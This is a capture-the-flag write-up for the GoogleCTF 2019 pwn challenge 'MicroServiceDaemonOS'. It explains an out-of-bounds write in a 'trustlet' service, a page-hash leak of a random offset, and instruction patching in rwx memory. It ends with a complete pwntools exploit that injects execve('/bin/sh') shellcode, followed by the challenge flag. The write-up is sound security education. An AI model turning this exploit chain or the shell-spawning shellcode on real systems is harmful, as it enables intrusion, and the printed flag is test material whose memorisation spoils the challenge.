---
title: MicroServiceDaemonOS - GoogleCTF Quals 2019
date: 2019-07-01 12:26:45
author: sherl0ck
author_url: https://twitter.com/sherl0ck__
categories:
  - Pwn
tags:
  - OOB
  - GoogleCTF
mathjax: true
---
## tl;dr

Out of bounds write in trustlet '1', allows us to write random bytes at an address of
our choice. We can write our shellcode to an rwx region with this, **without** any bruteforce.

**Note:** During the CTF we used a 1 byte brute-force to get write shellcode in the rwx segment and get shell. It was only afterwards that we realised that no bruteforce was required!

<!--more-->

**Solved by:** [night_f0x](https://twitter.com/vishnudevtj), [sherl0ck](https://twitter.com/sherl0ck__), [slashb4sh](https://twitter.com/slashb4sh)


## Reversing

The given binary provided is a 64-bit stripped ELF. It took us quite some time to reverse it and find the bug.
Essentially, the binary has 2 options - 'l' and 'c'. `l` allows the user to create trustlets that can be of 2 types - '1' or '0'. Each trustlet has the following structure:

```c
struct trustlet
{
  void* func_g; // rwx region
  void* func_s; // rwx region
  char* function_data;  // rw region
  char data[0x7ff8];
  uint64_t trustlet_type;
};
```

We can create a maximum of 10 trustlets & they are stored in an array in the following stack based structure -

```c
struct obj
{
  long size; // size of the trustlet array i.e the no. of initialised trustlets
  struct trustlet tlet[10];
};
```

The `l` option also copies the code of a couple of functions from the text segment to the segment pointed to by the func* pointers in the trustlet structure (we'll come to details of these functions shortly).
Thus each trustlet has 2 functions associated with it, lets name them 'g' and 's' (these are the keys with which we trigger the calls).

By the way there is also a global array, say `offset_array`, which contains a randomly assigned integer value
corresponding to each trustlet created.

The `c` functionality executes the functions `g`/`s` that are associated with the trustlets. It takes the index of a trustlet, asks us whether to execute `g` or `s` and based on this, executes `func_g` or `func_s`.
Lets talk about these functions now.

For trustlet '1' -
* **Function g** : It takes our input and an offset (provided by the user). The `function_data` is offsetted by the value
corresponding to the specific trustlet in the global `offset_array`. Our offset is added to this value (lets call this
as `target`). A byte from `target` is xored with a random value and saved in `target` as well as our input string
and our updated input string is returned. (I skipped some details here, but we'll get back to it.)
* **Function s** : Takes an input buffer with it's size, xor's them and returns the result.

For trustlet '0' -
* **Function g** : Takes a page offset (`pgoff`) and a page count (`pgcnt`) and "hashes" the content of `pgcnt` pages
one by one, starting from the `pgoff` page. The "hash" for each page is stored as in an `int` array in the last page, and this is returned by the function.
* **Function s** : Sets the bytes in `trustlet->data`, which lies in stack.

## Vulnerability

In the `s` function of the trustlet with type `1`, the offset that we provide can be negative. Thus we can write to addresses that lie before the original `function_data` segment of the corresponding trustlet.
Here's how the various trustlets are arranged in the memory -

```
0x00007fffa7a0c000 0x00007fffa7a14000  rwx    # func_g and func_s of trustlet at offset 0
0x00007fffa7a14000 0x00007fffafa0c000  rw-    # function_data region of trustlet at offset 0
0x00007fffafa0c000 0x00007fffafa14000  rwx    # func_g and func_s of trustlet at offset 1
0x00007fffafa14000 0x00007fffb7a0c000  rw-    # function_data region of trustlet at offset 1
0x00007fffb7a0c000 0x00007fffb7a14000  rwx
0x00007fffb7a14000 0x00007fffbfa0c000  rw-
```

So if we have the OOB write in trustlet at offset 1, we can write to the data of `func_g` and `func_s` of this
trustlet. But here comes the issue that we can't predictively tell the address that we will write to as the
`function_data` is offsetted by a random value.

So we first have to somehow leak the value of this random value before we go on to exploiting this. Lets move on...

## Exploit

### Leaking the random value

First we need some way to get the random value corresponding to a trustlet, stored in `offset_array`. Since we can give a large negative value as the offset, we can write to the `function_data` section of the previous
trustlet. So what is the use of this? Recall what the `g` function of a trustlet with type `1` does. It hashes the
content of a page and saves this in an int array that is printed out. So we first create a trustlet of type `0` and
then another with type `1`. After that print the hashes of all the pages of the (currently empty) `function_data` section (basically call `g` on trustlet with index 0, with offset=0 and count=0x7fd8). Now we give such an
offset in the `s` function of the trustlet with `type 1` that the random value will definitely be written in the
`function_data` section of the previous `type 1` trustlet. After this again call `g` function of `type 0` with
count=0x7fd8 and offset=0. This will again print out the hashes of all the pages. Now all we have to do is see which page a different hash from the initial one and we can predict the random value.

Now we have to calculate the offset to give in the `s` function of trustlet 1. `0x00007fffa7a14000` is the start of
the `function_data` of trustlet 0 and `0x00007fffafa14000` is that of trustlet 1. If we subtract these we get
`0x8000000`. If the offset is `-0x8000000` then the target address is sure to lie in the function_data of the
previous trustlet. Moreover, with this as the index, the page_offset we get from comparing the mismatched
page hash in `g` function of trustlet 0 will be the page index of the offsetted `function_data` segment of type 1. Thus the random value can be obtained by multiplying this with 1024.

```python
set_t(0)
set_t(1)

s1(1, 0x40, -0x8000000, "A" * 0x40)
g0(0, 0, 0x7fd8)
buf = io.recvuntil("\n")[:-1]

key = buf[:4]
offset = 0

for i in xrange(0, 0x7fd8 * 4, 4):
    if buf[i:i + 4] == key:
        continue
    else:
        offset = i
        break

log.info("Found : " + hex(offset))
log.info("Distance from function_data : " + hex(offset*0x400))
```

### Getting arbitrary (controlled) write

Right so now that we have the value of the `offset_array` of the trustlet with index 1, we can write to any
address that lies before the `function_data` of this trustlet. But where do we write? The obvious choice is the
`func_g` or `func_s` segment of this trustlet, as they are `rwx` regions and we can call them at our choice.

But here comes the next problem; we can't write data of our choice. What is written at the target address is
the byte at the address xor'ed with a random value. One obvious solution is to use bruteforce to get a
shellcode in the `func_g` segment. But the smallest shellcode (stub) that we could think of was around
12-15 bytes. Given the network speed in our locality, this could take ages. So we had to optimize.

Lets take a look at the code that actually creates the array from which the random value
that is used in the xoring comes.

```c
for ( j = 0; j <= 0xFF; ++j )
    rand_val_array[j] = j;

for ( k = 0; k <= 0xFF; ++k )
{
  v25 = (rand_val_array[k] + v25 + *(k % rand_val_buffer_size + rand_val_buffer));

  /* Some swapping operation now */

  v22 = &rand_val_array[k];
  v21 = &rand_val_array[v25];
  v20 = *v22;
  *v22 = *v21;
  *v21 = v20;
}
```

Thus initially `rand_val_array[i]` = `i`. After this using a buffer with random bytes, we calculate an index and
swap the value in `rand_val_array` at this index.

So what if we bruteforce the termination value of the second `for` loop to make it `0`? Then the for loop would become -

```c
for ( k = 0; k <= 0; ++k )
{
  :
  :
```

Thus now the code within this loop will never be executed.

Do remember that the target we are bruteforcing is the `func_s` section of the trustlet at index 1.
So we bruteforced the 1 byte here.

```python
while True:
    out = write_val(0x288, 0) # return value is the byte that has been written
    log.info(out)
    if out == 0:
        break
```

It was afterwards that it struck us that this can be done without any bruteforce, by overwriting the initialization value of `k`.

```
gef➤ x/i 0x000555555555559
 0x555555555559:	mov    DWORD PTR [rbp-0x7c],0x0
```

As you can see, the instruction is 'mov _DWORD_ PTR' (makes sense as `k` is an int variable).
So we can overwrite the second last byte with any number (other than 0 of course) and k is larger than 0xff!
Here we have a 1/256 probablity of being _wrong_! Thus no bruteforce required...

```python
 out = write_val(0x1de, 0)
```

So what did we gain from this? Well now `rand_val_array` is not random anymore. It is just an array with
`array[i]=i`. Now lets take a look at the code that does the xoring...

```c
a = 0;
b = 0;
for ( l = 0; input_size > l; ++l )
{
  a = (a + 1);
  b = (rand_val_array[a] + b);

  // Swapping now
  v12 = &rand_val_array[a];
  v11 = &rand_val_array[b];
  v10 = *v12;
  *v12 = *v11;
  *v11 = v10;

  v9 = rand_val_array[(rand_val_array[a] + rand_val_array[b])];
  *(l + save_area) = v9 ^ *(l + target);
}
```

Lets assume that our `input_size` is always 1 (we give only one bytes at a time). Thus the loop will run only
once. The snippet updates the value of `a` and `b`, swaps `rand_val_array[a]` with `rand_val_array[b]` and xors a byte from the target address with `rand_val_array[(rand_val_array[a] + rand_val_array[b])]`. Since the loop
runs only once, the swapping has no effect
(`rand_val_array[a] + rand_val_array[b]` = `rand_val_array[b] + rand_val_array[a]`)

Also we can calculate `v9`.
* a=b=0
* a = (a+1) = 1
* b = (rand_val_array[a] + b) = (rand_val_array[1] + 0) = 1
* v9 = (rand_val_array[a] + rand_val_array[b]) = 1+1 = 2 (a and b are 1)

So our target value will be xored with 2. Lets set our target address to the place where the initial value of b is
set to zero.

```
gef➤ x/i 0x000555555555649
   0x555555555649:	mov    DWORD PTR [rbp-0xc0],0x0

```

If we xor that `0` with 2, the updated instruction reads -

```
   0x555555555649:	mov    DWORD PTR [rbp-0xc0],0x2
```

Thus initial value of `b` is now 2. Doing this 5 times sets the initial value of `b` to 62 (bear with me, everything will be clear in a minute :P) and the code looks like

```c
a = 0;
b = 62;
for ( l = 0; input_size > l; ++l )
{
  a = (a + 1);
  b = (rand_val_array[a] + b);

  // Ignore the Swapping part

  v9 = rand_val_array[(rand_val_array[a] + rand_val_array[b])];
  *(l + save_area) = v9 ^ *(l + target);
}
```

Thus value of `v9` = (62+1)+1 = 64.

So whatever target address we give now, `*target = *target ^ 64`.

This piece of code is present at the start of the `s` function of trustlet 1

```c
offsetted_function_data = (offset_array_value << 12) + *(struct_1 + 16);
save_area = offsetted_function_data + 64;
for ( i = 0; i < input_size; ++i )
  *(i + offsetted_function_data) = *(i + input);

```

The second line sets the `save_area` to `offsetted_function_data + 64`. Looking at the assembly -

```
0000555555555492 :  mov  rax, [rbp+offsetted_function_data]
0000555555555496 :  add  rax, 40h

```

`64 ^ 64` = 0. So we can change that second line to

```c
save_area = offsetted_function_data + 0;
```

So `save_area` = `offsetted_function_data` ! Also take a look at the third line of code (the for loop). It copies our input to the `offsetted_function_data` address.

And now for the finale; the final part of the puzzle with which all the above stuff will make sense. Look at the
part how data at the target is written -

```c
for ( m = 0; m < input_size; ++m )
    *(m + target) = *(m + save_area);
```

Ahhh! The target address is set using the `save_area`, but the `save_area` is the `offsetted_function_data` which has our input ! So we can write our (uncorrupted) input at an arbitrary address. But one last snag still remains -

```c
a = 0;
b = 62;
for ( l = 0; input_size > l; ++l )
{
  a = (a + 1);
  b = (rand_val_array[a] + b);

  // Ignore the Swapping part

  v9 = rand_val_array[(rand_val_array[a] + rand_val_array[b])];
  *(l + save_area) = v9 ^ *(l + target);
}
```

This corrupts the `save_area`. But this is not an issue now. We just xor the initial value of `l` (the loop variable) with 64 to get the loop as -

```c
for ( l = 64; input_size > l; ++l )
{
  :
  :
```

So provided that our `input_size` is less than 64, we are done !

All that is left is to give a shellcode as an input and decide on a target address. We gave the target address as the `func_g` of this trustlet (index = 1). So our shellcode got copied to `func_g`. Now on running `func_g` we get shell !!!

Here is the full exploit -

```python
from pwn import *

binary = ELF("./MicroServiceDaemonOS")
context.binary = binary

s = lambda x: io.send(str(x))
sa = lambda x, y: io.sendafter(str(x), str(y))
sla = lambda x, y: io.sendlineafter(str(x), str(y))
sl = lambda x: io.sendline(str(x))
r = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(str(x))

if True:
    io = remote("microservicedaemonos.ctfcompetition.com", 1337)
else:
    io = binary.process()

def set_t(t):
    sla("Provide command: ", str('l'))
    sla("Provide type of trustlet: ", str(t))


def g1(idx):
    sla("Provide command: ", str('c'))
    sla("Provide index of ms: ", str(idx))
    sla("Call type: ", str('g'))


def s1(idx, size, off, inp):
    sla("Provide command: ", str('c'))
    sla("Provide index of ms: ", str(idx))
    sla("Call type: ", str('s'))
    sla("Provide data size: ", str(size))
    sla("Provide data offset: ", str(off))
    s(str(inp))


def g0(idx, off, count):
    sla("Provide command: ", str('c'))
    sla("Provide index of ms: ", str(idx))
    sla("Call type: ", str('g'))
    sla("Provide page offset: ", str(off))
    sla("Provide page count: ", str(count))


def s0(idx):
    sla("Provide command: ", str('c'))
    sla("Provide index of ms: ", str(idx))
    sla("Call type: ", str('s'))


def write_val(off, val):
    s1(1, 1, (-(offset * 0x400) - (0x8000 - off)), chr(val))
    return ord(io.recv(1))


set_t(0)
set_t(1)

s1(1, 0x40, -0x8000000, "A" * 0x40)
g0(0, 0, 0x7fd8)

buf = io.recvuntil("\n")[:-1]
key = buf[:4]

log.info("key : " + hex(u32(key)))

offset = 0
for i in xrange(0, 0x7fd8 * 4, 4):
    if buf[i:i + 4] == key:
        continue
    else:
        offset = i
        break
log.info("Found : " + hex(offset))
log.info("Distance from function_data : " + hex(offset*0x400))

''' this while loop was for the one byte bruteforce'''

# while True:
#     out = write_val(0x288, 0)
#     log.info(out)
#     if out == 0:
#         break

out = write_val(0x1de, 0)

''' change 'b' to 62 '''

for i in range(5):
    write_val(0x2cf, 0)

write_val(0x119, 0) # 64 ^ 64 so save_area = offsetted_function_data
write_val(0x2d9, 0) # overwrite the initial value of loop variable k to 64

write_addr = (-(offset * 0x400) - (0x8000 - 0x0))

shellcode = asm('''
xor rsi,rsi
xor rdx,rdx
xor rcx,rcx
mov rbp,0x68732f6e69622f
push rbp
mov rdi,rsp
mov rax,0x3b
syscall
''')

s1(1, 0x30, write_addr, shellcode)
s1(1, 0x40, 0x0, "A")

io.interactive()
```

**Flag**: `CTF{TZ-1n_us3rspac3-15-m3ss-d0nt-y0u-th1nk_s0?}`

## Conclusion

A simpler way to solve this would be to forge, by bruteforcing 12 bytes, a shellcode to read more data into the  `rwx` region. This was our initial idea, but due to a slow network we spent some time trying to optimize the
bruteforce before stumbling on to the solution that only uses a 1-byte bruteforce. Afterwards we realised that this could have been done without bruteforce :)

This was the only pwn we solved in this CTF. All the `pwn` and `sandbox` challenges of this CTF were really cool
and creative !
